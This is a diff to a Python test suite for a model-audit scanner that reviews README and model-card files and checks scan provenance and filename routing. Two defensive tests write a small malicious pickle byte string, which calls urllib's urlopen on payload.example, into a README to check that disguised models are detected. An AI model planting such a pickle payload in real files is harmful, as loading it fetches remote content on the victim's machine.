@@ -76,6 +76,13 @@ class FakeReviewer:
         return AgentResponse(assessments=assessments)
 
 
+def text_provenance(*paths: Path) -> dict[str, Any]:
+    return {
+        "assets": [{"path": str(path), "type": "text"} for path in paths],
+        "file_metadata": {str(path): {"scanner_dependency_ids": ["text"]} for path in paths},
+    }
+
+
 def fake_scan(
     monkeypatch: pytest.MonkeyPatch, exit_code: int, *, malformed: bool = False, network_count: int = 1
 ) -> list[bytes]:
@@ -91,6 +98,7 @@ def fake_scan(
             "rule_code": "S402",
         }
         report = {
+            **text_provenance(Path(location)),
             "issues": [record] * network_count
             + [{"severity": "critical", "message": "Pickle execution", "location": "model.pkl"}],
             "checks": [{**record, "name": "Network Communication Detection", "status": "failed"}] * network_count,
@@ -230,7 +238,7 @@ def test_prepare_only_never_calls_agent(tmp_path: Path, monkeypatch: pytest.Monk
     assert all(item["display_action"] == "retain" for item in report["entries"])
 
 
-@pytest.mark.parametrize("filename", ["README.md", "readme", "model-card.md", "MODEL_CARD.txt", "modelcard.md"])
+@pytest.mark.parametrize("filename", ["README.md", "readme", "model_card.md", "MODEL_CARD.txt", "modelcard.md"])
 @pytest.mark.parametrize("newline", [b"\n", b"\r\n"])
 def test_full_document_preserves_later_fences_and_raw_byte_citations(
     tmp_path: Path, filename: str, newline: bytes
@@ -252,7 +260,10 @@ def test_full_document_preserves_later_fences_and_raw_byte_citations(
     source.write_bytes(data)
     root = tmp_path / "snapshot"
     artifacts = snapshot(source, root, max_bytes=10000)
-    raw = {"issues": [{"location": str(root / filename), "severity": "warning", "details": {"type": "url_detected"}}]}
+    raw = {
+        **text_provenance(root / filename),
+        "issues": [{"location": str(root / filename), "severity": "warning", "details": {"type": "url_detected"}}],
+    }
     findings, evidence = index_findings(raw, "report-digest", root, artifacts)
     assert findings[0].selected
     assert evidence[0].text.encode() == data
@@ -322,7 +333,10 @@ def test_changed_document_is_rejected(tmp_path: Path) -> None:
     copy.write_text("after!")
     with pytest.raises(ValueError, match="digest changed"):
         index_findings(
-            {"issues": [{"location": str(copy), "severity": "warning", "details": {"type": "url_detected"}}]},
+            {
+                **text_provenance(copy),
+                "issues": [{"location": str(copy), "severity": "warning", "details": {"type": "url_detected"}}],
+            },
             "hash",
             root,
             artifacts,
@@ -547,9 +561,9 @@ def test_explicit_coverage_and_operational_failures_prevent_deemphasis(tmp_path:
     fixture = json.loads((Path(__file__).parent / "assets/agent_review_pr1913.json").read_bytes())
     case = fixture["cases"][0]
     if indicator == "operational_error":
-        case["report"]["file_metadata"] = {"/artifacts/README.md": {"operational_error": True}}
+        case["report"]["file_metadata"]["/artifacts/README.md"]["operational_error"] = True
     elif indicator == "inconclusive":
-        case["report"]["file_metadata"] = {"/artifacts/README.md": {"scan_outcome": "inconclusive"}}
+        case["report"]["file_metadata"]["/artifacts/README.md"]["scan_outcome"] = "inconclusive"
     elif indicator == "has_errors":
         case["report"]["has_errors"] = True
     else:
@@ -588,7 +602,7 @@ def test_documented_entrypoint_and_scanner_never_import_from_artifact_directory(
 
 
 def test_actual_ip_and_domain_issues_and_checks_are_selected(tmp_path: Path) -> None:
-    from modelaudit.scanners.text_scanner import TextScanner
+    from modelaudit.core import scan_model_directory_or_file
 
     source = tmp_path / "modelcard.md"
     source.write_text(
@@ -596,13 +610,18 @@ def test_actual_ip_and_domain_issues_and_checks_are_selected(tmp_path: Path) -> 
     )
     root = tmp_path / "snapshot"
     artifacts = snapshot(source, root, max_bytes=10000)
-    report = TextScanner().scan(str(root / source.name)).to_dict()
+    report = scan_model_directory_or_file(str(root / source.name), cache_enabled=False).model_dump(mode="json")
     findings, _ = index_findings(report, "report-digest", root, artifacts)
     for kind in ("ipv4_address", "ipv6_address", "domain_name"):
         matches = [finding for finding in findings if finding.record.get("details", {}).get("type") == kind]
         assert any(f.pointer.startswith("/issues/") for f in matches), kind
-        assert any(f.pointer.startswith("/checks/") for f in matches), kind
         assert all(f.selected for f in matches), kind
+    checks = [
+        finding
+        for finding in findings
+        if finding.pointer.startswith("/checks/") and finding.record.get("name") == "Network Communication Detection"
+    ]
+    assert checks and all(finding.selected for finding in checks)
 
 
 def test_parent_directory_input_scans_only_its_resolved_snapshot(
@@ -795,12 +814,17 @@ def test_failed_or_budget_blocked_group_does_not_discard_completed_group(tmp_pat
     root.mkdir()
     artifacts = []
     records = []
-    for filename in ("README.md", "model-card.md"):
+    for filename in ("README.md", "model_card.md"):
         content = case["document"].encode()
         (root / filename).write_bytes(content)
         artifacts.append(Artifact(path=filename, sha256=digest(content), size=len(content), role="documentation"))
         records.append({**case["report"]["issues"][0], "location": str(root / filename)})
-    report = {**case["report"], "issues": records, "checks": []}
+    report = {
+        **case["report"],
+        **text_provenance(root / "README.md", root / "model_card.md"),
+        "issues": records,
+        "checks": [],
+    }
     raw = json.dumps(report).encode()
     (tmp_path / "scan.json").write_bytes(raw)
 
@@ -916,3 +940,119 @@ def test_preflight_probes_normalized_gateway_endpoints(
     worker.preflight("http://gateway:8080/v1")
     loop = next(node for node in ast.parse(probes[0]).body if isinstance(node, ast.For))
     assert ast.literal_eval(loop.iter) == [("127.0.0.1", 12345), expected]
+
+
+@pytest.mark.parametrize(
+    "filename",
+    ["readme", "MODEL_CARD"]
+    + [
+        stem + extension
+        for stem in ("README", "model_card", "modelcard")
+        for extension in (".md", ".markdown", ".rst", ".txt")
+    ],
+)
+def test_supported_document_names_reach_actual_scanning_and_review(tmp_path: Path, filename: str) -> None:
+    source = tmp_path / filename
+    source.write_text('HOST = "192.168.1.100"\n')
+    output = tmp_path / "bundle"
+    reviewer = FakeReviewer()
+    assert runner.run(source, output, reviewer) == 1
+    scan = json.loads((output / "scan.json").read_bytes())
+    report = json.loads((output / "review.json").read_bytes())
+    assert scan["scanner_names"] == ["text"]
+    assert reviewer.calls == 1 and report["selected_count"] > 0
+    assert report["review_status"] == "complete"
+
+
+@pytest.mark.parametrize("filename", ["model-card.md", "modelcard", "model-card"])
+def test_unrouted_document_aliases_are_rejected_before_scan(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, filename: str
+) -> None:
+    source = tmp_path / filename
+    source.write_text('HOST = "192.168.1.100"\n')
+    captured = fake_scan(monkeypatch, 1)
+    output = tmp_path / "bundle"
+    with pytest.raises(ValueError, match="supported README/model-card filename"):
+        runner.run(source, output, None)
+    assert not captured and not output.exists()
+
+
+@pytest.mark.parametrize("quoted", [False, True])
+def test_readme_pickle_and_quoted_example_preserve_actual_scanner_outcomes(tmp_path: Path, quoted: bool) -> None:
+    payload = b"curllib.request\nurlopen\n(Vhttps://payload.example\ntR."
+    model = tmp_path / "model"
+    model.mkdir()
+    source = model / "README.md"
+    source.write_bytes(b"# Serialization example\n\n```text\n" + payload + b"\n```\n" if quoted else payload)
+    output = tmp_path / "bundle"
+    reviewer = FakeReviewer()
+    assert runner.run(model, output, reviewer) == (0 if quoted else 1)
+    scan = json.loads((output / "scan.json").read_bytes())
+    review = json.loads((output / "review.json").read_bytes())
+    assert review["selected_count"] == 0 and reviewer.calls == 0
+    assert all(entry["display_action"] == "retain" for entry in review["entries"])
+    if quoted:
+        assert scan["scanner_names"] == ["text"]
+        assert not any(entry["severity"] in {"warning", "critical"} for entry in scan["issues"])
+    else:
+        assert "pickle" in scan["scanner_names"]
+        assert any(entry["severity"] in {"warning", "critical"} for entry in scan["issues"])
+
+
+@pytest.mark.parametrize(
+    "provenance",
+    [
+        "missing_assets",
+        "missing_metadata",
+        "missing_dependencies",
+        "unknown",
+        "conflicting_assets",
+        "supplemental",
+        "separate_model",
+    ],
+)
+def test_review_requires_unambiguous_per_file_text_provenance(tmp_path: Path, provenance: str) -> None:
+    source = tmp_path / "README.md"
+    source.write_text("https://payload.example")
+    root = tmp_path / "snapshot"
+    artifacts = snapshot(source, root, max_bytes=10000)
+    path = str(root / source.name)
+    report = {
+        **text_provenance(root / source.name),
+        "scanner_names": ["text", "pickle"],
+        "issues": [{"location": path, "severity": "warning", "details": {"type": "url_detected"}}],
+    }
+    if provenance == "missing_assets":
+        report.pop("assets")
+    elif provenance == "missing_metadata":
+        report.pop("file_metadata")
+    elif provenance == "missing_dependencies":
+        report["file_metadata"][path] = {}
+    elif provenance == "unknown":
+        report["assets"][0]["type"] = "unknown"
+    elif provenance == "conflicting_assets":
+        report["assets"].append({"path": path, "type": "pickle"})
+    elif provenance == "supplemental":
+        report["file_metadata"][path]["scanner_dependency_ids"] = ["text", "pickle"]
+    else:
+        other = str(root / "model.pkl")
+        report["assets"].append({"path": other, "type": "pickle"})
+        report["file_metadata"][other] = {"scanner_dependency_ids": ["pickle"]}
+    findings, evidence = index_findings(report, "report-digest", root, artifacts)
+    assert findings[0].selected is (provenance == "separate_model")
+    assert bool(evidence) is (provenance == "separate_model")
+
+
+def test_single_model_disguised_as_document_requires_a_companion_directory(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    source = tmp_path / "README.md"
+    source.write_bytes(b"curllib.request\nurlopen\n(Vhttps://payload.example\ntR.")
+    captured = fake_scan(monkeypatch, 1)
+    output = tmp_path / "bundle"
+    assert runner.run(source, output, None) == 2
+    assert not captured
+    manifest = json.loads((output / "manifest.json").read_bytes())
+    review = json.loads((output / "review.json").read_bytes())
+    assert manifest["scan_status"] == "not_run"
+    assert "non-text format 'pickle'" in review["errors"][0]
